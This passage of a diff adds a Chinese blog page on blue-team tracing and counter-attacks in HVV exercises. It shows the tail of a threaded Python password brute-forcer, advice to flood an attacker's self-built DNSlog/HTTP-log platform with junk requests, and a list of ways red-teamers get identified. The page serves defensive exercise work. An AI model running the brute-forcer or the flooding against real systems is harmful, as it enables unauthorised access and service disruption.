+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Word Count: </span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">passwords</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Threads: </span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">threads</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">start</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># https://stackoverflow.com/questions/2846653/how-to-use-threading-in-python</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">attempts</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">    <span class="n">failures</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="n">concurrent</span><span class="o">.</span><span class="n">futures</span><span class="o">.</span><span class="n">ThreadPoolExecutor</span><span class="p">(</span><span class="n">max_workers</span><span class="o">=</span><span class="n">args</span><span class="o">.</span><span class="n">threads</span><span class="p">)</span> <span class="k">as</span> <span class="n">executor</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">future_to_check</span> <span class="o">=</span> <span class="p">{</span><span class="n">executor</span><span class="o">.</span><span class="n">submit</span><span class="p">(</span><span class="n">passwordcheck</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span> <span class="n">password</span> <span class="k">for</span> <span class="n">password</span> <span class="ow">in</span> <span class="n">passwords</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">future</span> <span class="ow">in</span> <span class="n">concurrent</span><span class="o">.</span><span class="n">futures</span><span class="o">.</span><span class="n">as_completed</span><span class="p">(</span><span class="n">future_to_check</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">password</span> <span class="o">=</span> <span class="n">future_to_check</span><span class="p">[</span><span class="n">future</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">data</span> <span class="o">=</span> <span class="n">future</span><span class="o">.</span><span class="n">result</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">                <span class="n">attempts</span> <span class="o">=</span> <span class="n">attempts</span> <span class="o">+</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">data</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Found Password: </span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">password</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">            <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">exc</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">failures</span> <span class="o">=</span> <span class="n">failures</span> <span class="o">+</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="si">%r</span><span class="s1"> generated an exception: </span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="n">exc</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Attempts: </span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">attempts</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Failures: </span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">failures</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">finish</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Seconds: </span><span class="si">{:.1f}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">finish</span> <span class="o">-</span> <span class="n">start</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Attemps per second: </span><span class="si">{:.1f}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">((</span><span class="n">failures</span> <span class="o">+</span> <span class="n">attempts</span><span class="p">)</span> <span class="o">/</span> <span class="p">(</span><span class="n">finish</span> <span class="o">-</span> <span class="n">start</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Password(s) required&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="针对dnslog的反制" class="headerLink">
+    <a href="#%e9%92%88%e5%af%b9dnslog%e7%9a%84%e5%8f%8d%e5%88%b6" class="header-mark"></a>9 针对dnslog的反制</h2><p>通过流量设备审计到他人的dnslog平台的url payload,那么针对他的url payload可以进行反制.一般而言,常见的dnslog平台,蓝队防守的时候可以对厂家爱你的dnslog平台进行屏蔽.那么针对自行搭建的dnslog平台有以下思路</p>
+<p>dnslog反制,可以批量ping捕获到的dnslog,然后而已扰乱他自行搭建的,恶意制造各种垃圾dnslog数据,让他无法获取到有效的信息,直接让红队人员被迫抛弃一个红队基础设施.具体可以写一个脚本比如站长之家之类的进行批量平,进行探测存活</p>
+<p>httplog反制同理,可以使用爬虫节点,批量进行request请求捕获的http url即可,这样红队的dnslog平台几乎彻底报废.</p>
+<h3 id="攻击者画像" class="headerLink">
+    <a href="#%e6%94%bb%e5%87%bb%e8%80%85%e7%94%bb%e5%83%8f" class="header-mark"></a>9.1 攻击者画像：</h3><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616001146686.png" title="image-20230616001146686" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616001146686.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616001146686.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616001146686.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616001146686.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230616001146686.png 2x"
+            sizes="auto"
+            alt="image-20230616001146686">
+    </a></figure></p>
+<h3 id="常见红队被反杀的姿势" class="headerLink">
+    <a href="#%e5%b8%b8%e8%a7%81%e7%ba%a2%e9%98%9f%e8%a2%ab%e5%8f%8d%e6%9d%80%e7%9a%84%e5%a7%bf%e5%8a%bf" class="header-mark"></a>9.2 常见红队被反杀的姿势</h3><ol>
+<li>使用个人工作pc,且浏览器里面保存了百度 163 sina等登录凭据,攻击对抗过程中踩到蓝队的蜜罐,被jsonp劫持漏洞捕获安全社交id,从而被溯源到了真实的姓名和所在公司</li>
+<li>可能是蓝队封禁ip太厉害的原因,红队个人或者团队,使用自己的网站进行vps进行扫描,vps上含有团伙组织https证书,或者vps ip绑定的域名跟安全社交id对应,从而被溯源到真实姓名和所在的公司</li>
+<li>部分攻击队写的扫描器payload里面含有攻击者的信息,如使用了私有的dnslog 攻击载荷里面含有安全社交id 含有个人博客资源请求等</li>
+<li>投递的钓鱼邮件里面的木马样本被蓝队采集,逆向 反控c2c 溯源到个人信息</li>
+<li>虚拟机逃逸打到实体机,暴露个人全部真实信息的</li>
+</ol>
+<p>以下是狼蛛安全实验室的几篇溯源研究：</p>
+<p><a href="https://www.freebuf.com/articles/network/351431.html" target="_blank" rel="noopener noreferrer">溯源专题 |通过PDF文件信息进行攻击溯源</a></p>
+<p><a href="https://www.freebuf.com/articles/network/351348.html" target="_blank" rel="noopener noreferrer">溯源专题 | 通过时间与时区溯源</a></p>
+<p><a href="https://www.freebuf.com/articles/network/349868.html" target="_blank" rel="noopener noreferrer">溯源专题 | 通过lnk样本进行攻击溯源</a></p>
+<p><a href="https://www.freebuf.com/articles/network/341745.html" target="_blank" rel="noopener noreferrer">溯源专题 | 通过压缩文件溯源攻击者信息</a></p>
+<p><a href="https://www.freebuf.com/articles/network/352952.html" target="_blank" rel="noopener noreferrer">溯源专题 | 通过分析样本组合进行溯源</a></p>
+<p><a href="https://www.freebuf.com/articles/network/349867.html" target="_blank" rel="noopener noreferrer">溯源专题 | 通过PE中的“富签名”进行攻击溯源</a></p>
+<p>【参考资料】：</p>
+<p>网盾网络安全培训《webshell溯源排查与反制》</p>
+<p>CSDN-vlan911《浅谈溯源反制与防溯源》</p>
+<p>奇安信攻防社区-《【hvv2022】溯源反制案例学习笔记》</p>
+<p><a href="https://xz.aliyun.com/t/4509" target="_blank" rel="noopener noreferrer">红队基础建设:隐藏你的C2 server - 先知社区 (aliyun.com)</a></p>
+<p><a href="https://xz.aliyun.com/t/8385" target="_blank" rel="noopener noreferrer">https://xz.aliyun.com/t/8385</a></p>
+<p><a href="https://www.secrss.com/articles/27611" target="_blank" rel="noopener noreferrer">https://www.secrss.com/articles/27611</a></p>
+<p><a href="https://www.54cto.com/webaq/1101.html" target="_blank" rel="noopener noreferrer">防守反制&ndash;爆破CS Teamserver 密码</a></p>
+</div>
+
+        
+
+
+<h2>Related Content</h2>
+<div class="related-container">
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/buuctf_reinforce_wp/">BUUCTF awdp加固题</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/ctfhub--info_leakage/">ctfhub_信息泄露wp</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/ctfshow_deserialize/">ctfshow_deserialize</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/ctfshow_file_include/">ctfshow_file_include</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/ctfshow_file_upload/">ctfshow_file_upload</a>
+            </h2>
+        </div>
+    
+
+</div>
+
+<div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 0001-01-01</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span><a class="link-to-mardown" href=/hvv_traceabilitycountermeasures/index.md target="_blank" rel="noopener noreferrer">Read markdown</a>
+                    </span><span>|&nbsp;<a class="link-to-source" href=https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\hvv_Traceability&countermeasures.md target="_blank" rel="noopener noreferrer">View source</a>
+                    </span><span>|&nbsp;<a class="link-to-edit" href=https://github.com/HEIGE-PCloud/DoIt/edit/main/exampleSite/content/posts\hvv_Traceability&countermeasures.md target="_blank" rel="noopener noreferrer">Edit this page</a>
+                    </span><span>|&nbsp;<a class="link-to-report" href=https://github.com/HEIGE-PCloud/DoIt/issues/new?title=[bug]%20hvv_%E8%93%9D%E9%98%9F%E6%BA%AF%E6%BA%90%E5%8F%8D%E5%88%B6&body=|Field|Value|%0A|-|-|%0A|Title|hvv_%E8%93%9D%E9%98%9F%E6%BA%AF%E6%BA%90%E5%8F%8D%E5%88%B6|%0A|Url|http://scofield1920.github.io/hvv_traceabilitycountermeasures/|%0A|Filename|https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\hvv_Traceability&countermeasures.md| target="_blank" rel="noopener noreferrer">Report issue</a>
+                    </span></div>
+            <div class="post-info-share"><button title="Share on Twitter" data-sharer="twitter" data-url="http://scofield1920.github.io/hvv_traceabilitycountermeasures/" data-title="hvv_蓝队溯源反制" data-hashtags="web,hvv"><span class="fab fa-twitter fa-fw"></span></button><button title="Share on Facebook" data-sharer="facebook" data-url="http://scofield1920.github.io/hvv_traceabilitycountermeasures/" data-hashtag="web"><span class="fab fa-facebook-square fa-fw"></span></button><button title="Share on Hacker News" data-sharer="hackernews" data-url="http://scofield1920.github.io/hvv_traceabilitycountermeasures/" data-title="hvv_蓝队溯源反制"><span class="fab fa-hacker-news fa-fw"></span></button><button title="Share on Line" data-sharer="line" data-url="http://scofield1920.github.io/hvv_traceabilitycountermeasures/" data-title="hvv_蓝队溯源反制"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="Share on 微博" data-sharer="weibo" data-url="http://scofield1920.github.io/hvv_traceabilitycountermeasures/" data-title="hvv_蓝队溯源反制"><span class="fab fa-weibo fa-fw"></span></button><button title="Share on Telegram" data-sharer="telegram" data-url="http://scofield1920.github.io/hvv_traceabilitycountermeasures/" data-title="hvv_蓝队溯源反制" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
+        function shareOnMastodon(title, link) {
+            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
+            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
+            const domain = prompt("Enter your Mastodon domain", savedDomain);
+            if (domain === null) {
+                return;
+            }
+            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
+            const text = title + "\n\n" + link;
+            const url = new URL("https://" + domain)
+            url.pathname = "share"
+            url.searchParams.append('text', text)
+            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
+        }
+    </script>
+    <button title="Share on Mastodon"onclick="javascript:shareOnMastodon(&#34;hvv_蓝队溯源反制&#34;, &#34;http://scofield1920.github.io/hvv_traceabilitycountermeasures/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/web/">web</a>,&nbsp;<a href="/tags/hvv/">hvv</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/javascript_prototype_pollution/" class="prev" rel="prev" title="JavaScript 原型链污染"><i class="fas fa-angle-left fa-fw"></i>JavaScript 原型链污染</a>
+            <a href="/hvv_redteam_information_collection/" class="next" rel="next" title="hvv_红队外围信息收集">hvv_红队外围信息收集<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="utterances"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.120.4">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="Back to Top">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hugo-DoIt/utterances-comments"}},"data":{"desktop-header-typeit":"Scfie1d-Blog","mobile-header-typeit":"Scfie1d-Blog"},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"en_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":300,"type":"algolia"},"sharerjs":true,"table":{"sort":true},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="/js/utterances.min.js" defer></script></div>
+</body>
+
+</html>
